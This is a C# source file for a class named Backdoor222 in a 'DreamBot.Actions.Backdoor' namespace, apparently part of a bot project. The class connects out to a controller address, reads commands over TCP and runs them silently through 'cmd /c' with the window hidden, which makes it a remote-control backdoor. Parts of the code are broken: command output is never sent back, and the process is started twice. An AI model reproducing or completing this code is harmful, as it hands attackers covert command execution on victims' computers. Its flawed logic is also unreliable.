using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace DreamBot.Actions.Backdoor
{
    class Backdoor222
    {
        private readonly IPEndPoint _controller;
        private Stream _stream;

        public Backdoor222(IPEndPoint controller)
        {
            _controller = controller;
        }

        public void Concect()
        {
            var conectando = new TcpClient();
            conectando.Connect(_controller);
            _stream = conectando.GetStream();
            Receive();
        }

        public void Receive()
        {
            while (true)
            {
                try
                {
                    string command;
                    var buffer = new byte[0xff];
                    using (var mem = new MemoryStream())
                    {
                        var readed = 0;
                        do
                        {
                            readed = _stream.Read(buffer, 0, buffer.Length);
                            mem.Write(buffer, 0, readed);
                        } while (readed > 0);
                        command = Encoding.ASCII.GetString(mem.ToArray());
                    }
                    var output = Execute(command);
                    var outputBuffer = Encoding.ASCII.GetBytes(output);


                }
                catch
                {
                    break;
                }
            }
        }

        public string Execute(string command)
        {
            var output = string.Empty;

            try
            {
                var startInfo = new ProcessStartInfo("cmd", "/c " + command)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true
                };

                using (var process = Process.Start(startInfo))
                {
                    process.OutputDataReceived += (sender, e) => output += Environment.NewLine + e.Data;
                    process.BeginOutputReadLine();
                    process.Start();
                    process.WaitForExit();
                }
            }
            catch(Exception e)
            {
                output = e.ToString();
            }
            return output;
        }
    }
}